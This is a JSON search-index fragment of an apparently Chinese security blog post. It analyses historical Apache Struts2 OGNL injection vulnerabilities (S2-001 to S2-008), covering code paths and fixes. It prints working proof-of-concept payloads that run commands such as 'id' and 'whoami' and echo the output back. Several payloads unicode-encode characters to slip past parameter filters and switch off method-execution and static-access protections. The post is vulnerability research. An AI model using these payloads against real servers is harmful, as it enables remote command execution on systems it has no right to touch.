Evaluation\u90e8\u5206\uff0c<code>(1)(2)(3)</code>\u4e2d<code>(1)(2)</code>\u88ab\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u89e3\u6790\uff0c\u5bf9\u4e8e<code>(1)</code>\u505a\u8868\u8fbe\u5f0f\u7684\u89e3\u6790\uff0c\u5982\u679c\u4f60\u7528<code>getValue((1)(2))</code>\u4f1a\u53d1\u73b0\u5176\u5b9e\u4e5f\u80fd\u6267\u884c\u547d\u4ee4\uff0c\u800c<code>setValue((1)(2)(3))</code>\u9700\u8981double evaluation\uff0c\u5b9e\u9645\u4e0a\u53d8\u6210<code>((1)(2))(3)</code>\uff0c\u5728\u540e\u7eed\u8c03\u7528<code>setValueBody</code>\u51fd\u6570\u65f6\u53d6\u51fa\u7684<code>children[0]</code>\u5c31\u662f<code>(1)(2)</code>\uff0c\u7b49\u540c\u4e8e\u8c03\u7528<code>Ognl.getValue((1)(2))</code>\u7684\u6548\u679c\u3002\u6240\u4ee5\u8fd9\u91cc\u8c03\u7528<code>setValue</code>\u4e5f\u540c\u6837\u53ef\u4ee5\u8fbe\u6210<code>getValue</code>\u7684\u8ba1\u7b97OGNL\u8868\u8fbe\u5f0f\u7684\u6548\u679c\u3002</p> <p></p> <p>\u540c\u6837\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528<code>children[1]</code>\u7684\u4f4d\u7f6e\uff0c\u5982<code>(1)((2)(3))</code>\u628apayload\u653e\u5230<code>(2)(3)</code></p> <p>\u5173\u4e8e<code>setValue</code>\u51fd\u6570\u7684\u53e6\u4e00\u79cd\u5229\u7528\u65b9\u6cd5S2-009\u7684\u65b9\u5f0f<code>a[(1)(2)]</code>\uff0c\u5176\u4e2d<code>(1)(2)</code>\u540e\u7eed\u4f1a\u5355\u72ec\u62ff\u51fa\u6765\u88ab\u5f53\u4f5cOGNL\u8868\u8fbe\u5f0f\u6267\u884c\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#0x02","title":"0x02 \u5386\u53f2\u7248\u672c\u56de\u987e","text":"","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#1-s2-001","title":"1. S2-001","text":"<p>\u53c2\u8003\uff1ahttps://xz.aliyun.com/t/2044</p> <p>\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\u5728\u4e8e\uff1a\u7528<code>&lt;s:textfield&gt;</code>\u6807\u7b7e\uff0c\u539f\u6837\u8fd4\u56de\u7528\u6237\u8f93\u5165\u65f6\uff0c\u4f1a\u8fc7\u4e00\u6b21OGNL\u8868\u8fbe\u5f0f\u7684\u89e3\u6790\u6267\u884c\u3002\u6bd4\u5982\u573a\u666f\u767b\u9646\u7684\u5730\u65b9\uff0c\u7528\u6237\u540d\u5bc6\u7801\u6821\u9a8c\u9519\u8bef\uff0c\u4e0d\u8df3\u8f6c\u9875\u9762\uff0c\u76f4\u63a5\u5c06\u7528\u6237\u540d\u548c\u5bc6\u7801\u653e\u5230\u9875\u9762\u89e3\u6790\u540e\u8fd4\u56de\u3002</p> <p>source: \u4f7f\u7528\u4e86<code>s:textfield</code>\u6807\u7b7e\u7528\u4e8e\u8868\u5355\u751f\u6210\uff0c\u5f53\u7528\u6237\u8f93\u5165\u4e0d\u5408\u6cd5\u65f6\uff0c\u5c06\u7528\u6237\u7684\u8f93\u5165\u5185\u5bb9\u6e32\u67d3\u5230\u8fd4\u56de\u7684\u9875\u9762\u4e0a</p> <p>sink: jsp\u6e32\u67d3\u8c03\u7528<code>doEndTag</code>\uff0c\u540e\u7eed\u7531\u4e8e\u8bc6\u522b\u51fa\u7528\u6237\u8f93\u5165\u4e2dOGNL\u8868\u8fbe\u5f0f\u800c\u8c03\u7528<code>Ognl.getValue</code></p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_1","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u4e3b\u8981\u51fa\u95ee\u9898\u7684\u662fJSP\u4e2d<code>&lt;s:textfield&gt;</code>\u6807\u7b7e\uff0cStruts2\u91cc\u5904\u7406textfield\u7684\u662f<code>org.apache.struts2.components.UIBean</code></p> <p></p> <p></p> <p>\u770b\u5230\u5728\u5904\u7406params\u65f6\uff0c\u5f53parameters\u91cc\u4e0d\u5b58\u5728<code>value</code>\u8fd9\u4e2akey\u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u5230\u6267\u884cname\u76f8\u5bf9\u5e94\u7684value\u4e0a\u6765\u3002\u5e76\u4e14<code>altSyntax</code>\u9ed8\u8ba4\u914d\u7f6e\u4e3a<code>true</code></p> <p></p> <p>\u4f1a\u5728\u5f53\u524d\u7684<code>name</code>\u5de6\u53f3\u52a0\u4e0aOGNL\u8868\u8fbe\u5f0f\u7684\u6807\u8bc6<code>%{name}</code>\uff0c\u8fd9\u91cc\u7684name\u662f<code>&lt;s:textfield name=\"name\"</code>\uff0cname\u5b57\u6bb5\u7684\u503c\uff0c\u6bd4\u5982\u8fd9\u91cc<code>name=\"username\"</code>\uff0c\u6b64\u65f6\u4f1a\u53d8\u6210<code>%{username}</code>.\u7ee7\u7eed\u5f80\u4e0b\u8ddf</p> <p></p> <p></p> <p>\u8fd9\u91cc\u7684String\u7c7b\u578b\u7684\u8f6c\u5316\u4e3b\u8981\u7528\u4e86<code>TextParesUtil.translateVariables()</code>\u6765\u5904\u7406\uff0c\u8fd9\u91cc\u770b\u770b\u5177\u4f53\u4ed6\u600e\u4e48\u505a\u7684</p> <p><code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97</code></p> <p></p> <p>\u8fd9\u91cc\u4f1a\u53bb\u5224\u65ad\u4f20\u5165\u7684expression\u662f\u5426\u662fOGNL\u8868\u8fbe\u5f0f\u7684\u683c\u5f0f\u7684<code>%{xxx}</code>\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5c31\u4f1a\u53bb<code>OgnlValueStack</code>\u91cc\u9762\u53bb\u627e\u5bf9\u5e94\u7684\u5185\u5bb9(\u8fd9\u5757\u5c31\u662fOGNL\u8868\u8fbe\u5f0f\u7684\u8ba1\u7b97\u7ed3\u679c\uff0c<code>findValue</code>\u51fd\u6570\u540e\u7eed\u4f1a\u53bb\u8c03\u7528<code>OgnlUtil.getValue</code>\uff0c\u8be6\u7ec6\u7684\u53ef\u4ee5\u770b\u6211\u57fa\u7840\u91cc\u5217\u7684\u6587\u7ae0)</p> <p>\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u7b2c\u4e00\u904d\u4f20\u5165\u7684<code>%{name}</code>\u4f1a\u89e3\u6790\u83b7\u5f97\u5bf9\u5e94\u7684\u503c<code>%{@java.lang.Runtime.....}</code></p> <p>\u7b2c\u4e8c\u904d\u4f1a\u53bb\u89e3\u6790<code>%{@java.lang.Runtime....}</code>\uff0c\u8fd9\u91cc\u6267\u884c\u4e86\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u547d\u4ee4\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc","title":"\u56de\u663ePOC","text":"<p>\u524d\u9762\u7b80\u5355\u7528\u4e86OGNL\u8868\u8fbe\u5f0f\u8c03\u7528\u9759\u6001\u65b9\u6cd5\u7684\u5f62\u5f0f\u6765\u6267\u884c\u7cfb\u7edf\u547d\u4ee4<code>@java.lang.Runtime@getRuntime().exec(command)</code></p> <p>\u8fd9\u91ccS2-001\u5176\u5b9e\u662f\u4f1a\u76f4\u63a5\u56de\u663e\u7684\uff0c\u5c06\u66ff\u6362\u539f\u6709\u7684input\u6807\u7b7e\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u6362\u4e00\u79cd\u65b9\u5f0f\u6765\u8fdb\u884c\u56de\u663e\uff0c\u5229\u7528Struts2\u7684HttpServletResponse\u6765\u5199\u5165\u5185\u5bb9\u3002</p> <pre><code>#writer=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),\n#writer.println(xxxxxx),\n#writer.flush(),\n#writer.close()\n</code></pre> <p>\u5148\u4ece\u4e0a\u4e0b\u6587context\u4e2d\u53d6\u51fa<code>HttpServletResponse</code>\u7684\u5b9e\u4f8b\uff0c\u7528\u5230\u7684\u5b9e\u9645\u662f<code>HttpServletResponseWrapper</code></p> <p></p> <p>\u7136\u540e\u83b7\u53d6\u5f53\u524dresponse\u7684writer\u5bf9\u8c61\uff0c\u5728\u5229\u7528\u8be5writer\u6765\u5199\u5165\u4efb\u610f\u5185\u5bb9</p> <p>\u6bd4\u5982</p> <pre><code>%{#writer=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#writer.println(\"wh1t3p1g\"),#writer.flush(),#writer.close()}\n</code></pre> <p>\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u66ff\u6362\u6210\u6267\u884c\u547d\u4ee4\u540e\u7684\u5185\u5bb9</p> <pre><code>#pb=(new java.lang.ProcessBuilder(\"whoami\")).start(),\n#is=#pb.getInputStream(),\n#isr=new InputStreamReader(#is),\n#br=new BufferedReader(#isr),\n#chars=new char[500],\n#br.read(#chars),\n#str=new java.lang.String(#chars),\n// \u4e0a\u9762\u4e3b\u8981\u83b7\u53d6\u6267\u884c\u540e\u7684\u5185\u5bb9\uff0c\u4e0b\u9762\u4e3b\u8981\u505a\u56de\u663e\u64cd\u4f5c\n#writer=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),\n#writer.println(#str),\n#writer.flush(),\n#writer.close()\n\n%{#pb=(new java.lang.ProcessBuilder(\"whoami\")).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(), #writer.println(#str),#writer.flush(),#writer.close()}\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_2","title":"\u4fee\u590d","text":"<p>\u5728&gt;=2.0.9\u7248\u672c\u7684struts2\u4e0a\uff0c<code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables</code>\u505a\u4e86\u5faa\u73af\u5224\u65ad\uff0c\u4e0d\u5141\u8bb8\u9012\u5f52\u6267\u884cOGNL\u8868\u8fbe\u5f0f</p> <p></p> <p>\u9ed8\u8ba4<code>maxLoopCount</code>\u4e3a1\uff0c\u6240\u4ee5\u5904\u7406\u5b8c<code>%{name}</code>\u540e\uff0c\u4e0d\u4f1a\u518d\u7ee7\u7eed\u5bf9\u4ed6\u7684\u503c\u8fdb\u884cOGNL\u8868\u8fbe\u5f0f\u7684\u6267\u884c\u4e86\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#2-s2-003","title":"2. S2-003","text":"<p>\u5f71\u54cd\u8303\u56f4\uff1a2.0.0 - 2.0.11.2</p> <p>\u770b\u5b98\u7f51\u7684\u4ecb\u7ecd\uff0c\u95ee\u9898\u51fa\u5728<code>ParametersInterceptor</code>\uff0c\u524d\u9762\u5229\u7528\u4e86<code>Ognl.getValue</code>\u6765\u8ba1\u7b97OGNL\u8868\u8fbe\u5f0f\uff0c\u800cS2-003\u7528\u7684\u5219\u662f<code>Ognl.setValue</code>\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u53ef\u4ee5\u8ba1\u7b97OGNL\u8868\u8fbe\u5f0f</p> <p>source: \u53c2\u6570\u7684key\uff0c\u4f7f\u7528unicode\u7f16\u7801\u7ed5\u8fc7<code>#</code>\u7684\u68c0\u6d4b</p> <p>sink: \u8c03\u7528<code>Ognl.setValue</code></p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_3","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>Struts2\u5728\u5904\u7406\u53c2\u6570\u5185\u5bb9\u65f6\uff0c\u5c06\u8c03\u7528<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>\u51fd\u6570\uff0c\u586b\u5145\u5230OgnlVauleStack\u7684context\u4e0a\u4e0b\u6587\u91cc\u3002</p> <p></p> <p>\u8fd9\u91cc\u4f1a\u5148\u8fc7\u4e00\u6b21<code>acceptableName</code>\u7684\u68c0\u67e5\uff082.0.8\u7248\u672c\uff09</p> <p></p> <p>\u4e0d\u80fd\u51fa\u73b0<code>=</code>\u3001<code>,</code>\u3001<code>#</code>\u3001<code>:</code>\u4ee5\u53ca\u88ab\u6392\u9664\u5728\u5916\u7684\u53c2\u6570\u540d</p> <p></p> <p>\u53ea\u6709\u901a\u8fc7\u4e86acceptableName\u51fd\u6570\u7684\u68c0\u67e5\u624d\u80fd\u7ee7\u7eed\u5f80\u4e0b\u8d70\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u7ed5\u8fc7\u4e0a\u9762\u7684\u51e0\u4e2a\u95ee\u9898\uff0c\u8fd9\u91cc\u6f0f\u6d1e\u53d1\u73b0\u8005\u7528\u4e86unicode\u7f16\u7801\u6765\u7ed5\u8fc7\u68c0\u6d4b\u3002</p> <p><code>ognl.JavaCharStream#readChar</code></p> <p></p> <p>\u5f53\u9047\u5230<code>\\u</code>unicode\u7f16\u7801\uff0c\u4f1a\u505a\u4e00\u6b21\u8f6c\u6362\uff0c\u6bd4\u5982<code>\\u0040</code>\u4f1a\u88ab\u8f6c\u6210<code>@</code></p> <p>\u800c<code>acceptableName</code>\u51fd\u6570\u5e76\u6ca1\u6709\u8003\u8651unicode\u7f16\u7801\u7684\u65b9\u5f0f\uff0c\u5bfc\u81f4\u5176\u5f62\u540c\u865a\u8bbe\u3002</p> <p>\u56de\u5230<code>setParameters</code>\uff0c\u540e\u7eed\u8c03\u7528\u4e86<code>OgnlValueStack.setValue</code></p> <p></p> <p>\u8fd9\u91cc\u6700\u7ec8\u5230\u4e86<code>OgnlUtil.setValue</code>\u8ba1\u7b97OGNL\u8868\u8fbe\u5f0f</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_1","title":"POC\u5206\u6790","text":"<p>\u6765\u770b\u4e00\u4e2a\u8c03\u7528\u547d\u4ee4\u6267\u884c\u7684POC</p> <pre><code>('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0040java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app\\')')(bla)(bla)\n</code></pre> <p>\u5148\u6765\u770b\u7b2c\u4e00\u53e5\uff0c\u8be5\u6761ognl\u8868\u8fbe\u5f0f\u7528\u4e8e\u5f00\u542f\u65b9\u6cd5\u6267\u884c\uff0c\u56e0\u4e3a\u5728\u8c03\u7528<code>setParameters</code>\u4e4b\u524d\uff0c\u5f00\u53d1\u4eba\u5458\u8003\u8651\u5230\u4e86\u53c2\u6570\u6267\u884cOGNL\u8868\u8fbe\u5f0f\u7684\u98ce\u9669\uff0c\u6240\u4ee5\u63d0\u524d\u5173\u95ed\u4e86\u51fd\u6570\u8c03\u7528\u6267\u884c</p> <p></p> <p>\u8bbe\u7f6e\u5b8c\u4e86\u4e4b\u540e\uff0c\u518d\u8fd8\u539f\u56de\u6765</p> <p>\u4f46\u662fOGNL\u8868\u8fbe\u5f0f\u5bf9\u4e8e\u4e0a\u4e0b\u6587\u7684\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fdb\u884c\u51fd\u6570\u8c03\u7528\u524d\uff0c\u5c06context\u91cc\u7684<code>xwork.MethodAccessor.denyMethodExecution</code>\u8bbe\u4e3a<code>false</code>\uff0c \u8fd9\u6837\u7b2c\u4e8c\u53e5poc\u5c31\u53ef\u4ee5\u6267\u884c\u51fd\u6570\u8c03\u7528\u4e86\u3002</p> <p>\u6240\u4ee5\u5728\u53d1\u9001\u8fd9\u4e24\u6761POC\u65f6\uff0c\u9700\u8981\u63a7\u5236\u597d\u8bbe\u7f6efalse\u5728\u524d\uff0c\u6267\u884c\u5728\u540e\uff08ascii\u6392\u5e8f\uff0c\u53ef\u4ee5\u770b\u56de\u663epoc\u7684\u5904\u7406\uff09</p> <p>\u8ddf\u524d\u9762\u4e00\u6837\uff0c\u5199\u4e00\u4e0b\u56de\u663e\u7684POC</p> <pre><code>(a)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla))\n(b)(('\\u0023ret\\u003d@java.lang.Runtime@getRuntime().exec(\\'id\\')')(bla))&amp; // \u6267\u884c\u547d\u4ee4\n(c)(('\\u0023dis\\u003dnew\\u0020java.io.DataInputStream(\\u0023ret.getInputStream())')(bla))&amp;\n(d)(('\\u0023res\\u003dnew\\u0020byte[2000]')(bla))&amp;\n(e)(('\\u0023dis.readFully(\\u0023res)')(bla))&amp;\n(f)(('\\u0023writer\\u003d\\u0023context.get(\\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\\').getWriter()')(bla))&amp;\n(g)(('\\u0023writer.println(new\\u0020java.lang.String(\\u0023res))')(bla))&amp; // \u83b7\u53d6response\uff0c\u56de\u663e\u6570\u636e\n(h)(('\\u0023writer.flush()')(bla))&amp;\n(i)(('\\u0023writer.close()')(bla))\n</code></pre> <p>\u8fd9\u91ccpoc\u7684\u5148\u540e\u987a\u5e8f\u7528\u5230\u4e86\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u5b9e\u9645\u7684ognl\u8868\u8fbe\u5f0f\u653e\u5230\u4e86\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e<code>(1)((2)(3))</code></p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_4","title":"\u4fee\u590d","text":"<p>xwork&gt;=2.0.6 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>\u591a\u4e86\u4ee5\u4e0b\u4ee3\u7801</p> <p></p> <p>\u4f4e\u7248\u672c\u7528\u7684\u76f4\u63a5\u662f\u5df2\u5b58\u5728\u7684OgnlValueStack\uff0c\u4ece2.0.6\u5f00\u59cb\uff0c\u4f7f\u7528\u4e86\u4e00\u4e2a\u7a7a\u7684stack\u6765\u5904\u7406\u53c2\u6570\u7684\u89e3\u6790</p> <p>\u5e76\u4e14\u4ece\u8fd9\u4e2a\u7248\u672c\u5f00\u59cb\u591a\u4e86SecurityMemberAccess\uff0c\u7528\u6765\u9650\u5236ognl\u8868\u8fbe\u5f0f\u4e2d\u51fd\u6570\u8c03\u7528</p> <p>\u5728<code>ognl.OgnlRuntime#callAppropriateMethod</code>\u8c03\u7528\u51fd\u6570\u524d\uff0c\u4f1a\u53bb\u5224\u65ad\u51fd\u6570\u662f\u5426\u53ef\u88ab\u8bbf\u95ee(method\u4e0d\u4e3anull)</p> <p></p> <p>\u5176\u5b9e\u8fd9\u8fb9<code>isMethodAccessible</code>\u7684\u8fd4\u56de\u7ed3\u679c\u65e0\u6240\u8c13\uff0c\u4f46\u662f\u4e0d\u80fd\u5728\u8fd9\u4e2a\u51fd\u6570\u8c03\u7528\u65f6\u51fa\u9519\uff0c\u51fa\u9519\u7684\u8bdd\u4e5f\u5c31\u8d70\u4e0d\u5230<code>invokeMethod</code></p> <p>\u770b\u4e00\u4e0b\u5177\u4f53\u7684\u5b9e\u73b0\uff0c<code>isMethodAccessible</code>\u7684\u5224\u65ad\u4f9d\u8d56\u4e8e<code>SecurityMemberAccess</code></p> <p></p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u770b<code>isAcceptableProperty</code></p> <p></p> <p></p> <p></p> <p>\u4e0b\u7aef\u70b9\u8c03\u8bd5\u4f60\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u7248\u672cacceptProperties\u4e3a\u7a7a\uff0c\u800cexcludeProperties\u975e\u7a7a\uff0c\u6240\u4ee5\u5728\u8c03\u7528<code>isExclude</code>\u51fd\u6570\u65f6\uff0c\u6b63\u5219\u8c03\u7528<code>pattern.matcher(null)</code>\u4f1a\u62a5\u9519\uff0c\u4e5f\u5c31\u65e0\u6cd5\u8fbe\u5230\u8c03\u7528\u51fd\u6570\u7684\u76ee\u7684\u4e86\uff08<code>propertiesName</code>\u4e3anull\uff09\u3002</p> <p>\u6240\u4ee5\u5982\u679c\u8981\u7ed5\u8fc7\u8fd9\u4e2a\u7248\u672c\u7684\u9650\u5236\uff0c\u9996\u5148\u9700\u8981\u89e3\u51b3\u7684\u662f\u8fd9\u4e2a\u51fd\u6570\u7684\u62a5\u9519\u95ee\u9898\uff0c\u770bS2-005</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#3-s2-005","title":"3. S2-005","text":"<p>\u5f71\u54cd\u7248\u672c\uff1astruts2.0.0 - 2.1.8.1</p> <p>S2-005\u4e3aS2-003\u7684\u4fee\u590d\u7ed5\u8fc7\uff0c\u76f4\u63a5\u5206\u6790POC</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_2","title":"POC\u5206\u6790","text":"<pre><code>('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)&amp;\n('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;\n('\\u0040java.lang.Runtime@getRuntime().exec(\\'open\\u0020/System/Applications/Calculator.app\\')')(bla)(bla)\n</code></pre> <p>\u524d\u9762S2-003\u4fee\u590d\u90e8\u5206\u8bf4\u5230\u4e86\u9700\u8981\u7ed5\u8fc7<code>isAcceptableProperty</code>\u51fd\u6570\u62a5\u9519\u7684\u95ee\u9898\u624d\u80fd\u7ee7\u7eed\u5f80\u4e0b\u8fdb\u884c\u51fd\u6570\u8c03\u7528\u3002</p> <p>\u4ece\u4ee3\u7801\u4e0a\u770b\uff0c\u53ea\u8981<code>excludeProperties</code>\u548c<code>acceptProperties</code>\u4e3a\u7a7a\uff0c\u5c31\u4e0d\u4f1a\u8fdb\u5230\u6b63\u5219\u5339\u914d\u7684\u73af\u8282\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u4ed6\u4eec\u7f6e\u4e3a\u7a7a</p> <p>poc\u91cc\u7684\u7b2c\u4e00\u884c\u505a\u7684\u5c31\u662f\u8fd9\u4e2a\u4e8b\u60c5\uff0c\u5c06<code>excludeProperties</code>\u7f6e\u4e3a\u7a7a\u96c6\u5408</p> <p>\u8fd9\u91cc\u770b\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4ee5<code>#_memberAccess</code>\u7684\u65b9\u5f0f\u53ef\u4ee5\u8bbf\u95ee\u5230<code>OgnlContext</code>\u5bf9\u8c61\u7684<code>memberAccess</code>\u5c5e\u6027</p> <p><code>ognl.OgnlContext#get</code></p> <p></p> <p>\u4ece<code>OgnlContext</code>\u4e0a\u4e0b\u6587\u83b7\u53d6\u5185\u5bb9\uff0c\u9996\u5148\u4f1a\u5224\u65ad\u662f\u5426\u5728<code>RESERVED_KEYS</code>\u96c6\u5408\u91cc\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u76f8\u5e94\u7684\u8c03\u7528\u4ed6\u7684getters\uff0c\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u4ece\u5f53\u524d\u7684\u4e0a\u4e0b\u6587\u91cc\u53bb\u627e\u8fd9\u4e2akey\u3002</p> <p>\u6240\u4ee5<code>#_memeberAccess</code>\u5b9e\u9645\u83b7\u53d6\u7684\u662f<code>OgnlContext</code>\u7684<code>memeberAccess</code>\u5c5e\u6027\u5185\u5bb9</p> <p>\u8fd8\u6709\u51fa\u73b0\u53d8\u5316\u7684\u5730\u65b9\uff0c\u7531\u4e8e\u73b0\u5728context\u91cc\u662f\u6ca1\u6709response\u5bf9\u8c61\u53ef\u4ee5\u83b7\u53d6\u7684\uff0c\u6240\u4ee5\u5728\u5904\u7406\u56de\u663e\u7684\u65f6\u5019\u6211\u4eec\u9700\u8981\u627e\u53e6\u5916\u7684\u65b9\u6cd5</p> <pre><code>(a)(('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla))&amp;\n(a)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla))&amp;\n(b)(('\\u0023ret\\u003d@java.lang.Runtime@getRuntime().exec(\\'id\\')')(bla))&amp; // \u6267\u884c\u547d\u4ee4\n(c)(('\\u0023dis\\u003dnew\\u0020java.io.DataInputStream(\\u0023ret.getInputStream())')(bla))&amp;\n(d)(('\\u0023res\\u003dnew\\u0020byte[2000]')(bla))&amp;\n(e)(('\\u0023dis.readFully(\\u0023res)')(bla))&amp;\n(f)(('\\u0023writer\\u003d@org.apache.struts2.ServletActionContext@getResponse().getWriter()')(bla))&amp;\n(g)(('\\u0023writer.println(new\\u0020java.lang.String(\\u0023res))')(bla))&amp; // \u83b7\u53d6response\uff0c\u56de\u663e\u6570\u636e\n(h)(('\\u0023writer.flush()')(bla))&amp;\n(i)(('\\u0023writer.close()')(bla))\n</code></pre> <p>\u8fd9\u91cc\u4f7f\u7528\u4e86<code>@org.apache.struts2.ServletActionContext@getResponse()</code>\u9759\u6001\u65b9\u6cd5\u6765\u83b7\u53d6response</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_5","title":"\u4fee\u590d","text":"<p>xwork&gt;=2.2.1.1\uff0c\u5bf9\u53c2\u6570\u540d\u505a\u4e86\u66f4\u4e3a\u7ec6\u81f4\u7684\u6b63\u5219\u68c0\u67e5<code>[a-zA-Z0-9\\\\.\\\\]\\\\[\\\\(\\\\)_'\\\\s]+</code></p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#4-s2-007","title":"4. S2-007","text":"<p>\u8fd9\u91cc\u8ddfS2-008\u91cc\u9762\u7684\u7b2c\u4e00\u4e2a\u6f0f\u6d1e\u4e00\u6837</p> <p><code>com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept</code></p> <p></p> <p>value\u4e3a\u6211\u4eec\u4f20\u5165\u7684\u6570\u636e\uff0c\u8fc7\u4e86\u4e00\u6b21getOverrideExpr</p> <p></p> <p>\u5bf9\u6211\u4eec\u7684\u8f93\u5165\u56f4\u4e0a\u4e86\u5355\u5f15\u53f7\uff0c\u8fd9\u91cc\u5982\u679c\u6211\u4eec\u7684payload\u4e3a<code>'+xxxx+'</code>\uff0c\u8fd9\u91cc\u7684xxxx\u5c31\u9003\u9038\u51fa\u6765\u4e86\uff0c\u800c\u4e0d\u5355\u5355\u662f\u5b57\u7b26\u4e32\u4e86</p> <p></p> <p>\u540e\u7eed\u5c06\u5904\u7406\u597d\u7684\u6570\u636e\u653e\u5230\u4e86stack\u7684overrides\u91cc\u9762</p> <p>\u800c\u5b9e\u9645\u89e6\u53d1\u7684\u5730\u65b9\u8ddfS2-001\u4e00\u6837\uff0c\u662f\u5728\u89e3\u6790JSP\u7684\u65f6\u5019\u9020\u6210\u7684  \u5728<code>tryFIndValue</code>\u51fd\u6570\u4e2d\uff0c\u4ecestack\u7684overrides\u4e2d\u53d6\u51fa\u524d\u9762\u52a0\u4e86\u5355\u5f15\u53f7\u7684\u6570\u636e\uff0c\u5e76\u5728\u540e\u7eed\u8c03\u7528<code>Ognl.getValue</code>\uff0c\u5bfc\u81f4\u4e86Ognl\u8868\u8fbe\u5f0f\u7684\u6267\u884c\u3002</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_3","title":"POC","text":"<pre><code>'+ (#_memberAccess.allowStaticMethodAccess=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) +'\n</code></pre> <p>xwork&gt;=2.2.3\uff0cognl\u8868\u8fbe\u5f0f\u8ba1\u7b97\u65f6\uff0c\u8c03\u7528\u51fd\u6570\u7684\u51fd\u6570\u5224\u65ad<code>isAcceptableProperty</code>\u5982\u679cname\u4e3anull\u76f4\u63a5\u8fd4\u56detrue\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u7528\u50cfs2-005\u90a3\u6837\u628a<code>excludeProperties</code>\u7f6e\u4e3a\u7a7a\u96c6\u5408\u3002</p> <p></p> <p>\u4f46\u662f\u4ece\u8fd9\u91cc\u5f00\u59cb\uff0c<code>allowStaticMethodAccess</code>\u9ed8\u8ba4\u4e3afalse\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u7f6e\u4e3atrue\uff0c\u624d\u80fd\u6b63\u5e38\u6267\u884c\u9759\u6001\u51fd\u6570\u3002</p> <p>\u6240\u4ee5POC\u7b2c\u4e00\u4e8c\u53e5\u90fd\u662f\u5728\u89e3\u9664\u9650\u5236\uff0c\u7b2c\u4e09\u53e5\u6267\u884c\u547d\u4ee4</p> <p>\u5199\u4e00\u4e0b\u56de\u663e\u7684POC</p> <pre><code>'+ (\n#_memberAccess.allowStaticMethodAccess=true,\n#context['xwork.MethodAccessor.denyMethodExecution']=false,\n#ret=@java.lang.Runtime@getRuntime().exec('id'),\n#isr=new java.io.InputStreamReader(#ret.getInputStream()),\n#br=new java.io.BufferedReader(#isr),\n#res=new char[2000],\n#br.read(#res),\n#writer=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter(),\n#writer.println(new java.lang.String(#res)),\n#writer.flush(),\n#writer.close()\n) +'\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#5-s2-008","title":"5. S2-008","text":"<p>S2-008\u4e00\u5171\u67094\u4e2a\u6f0f\u6d1e\uff0c\u8be6\u7ec6\u770bhttps://cwiki.apache.org/confluence/display/WW/S2-008</p> 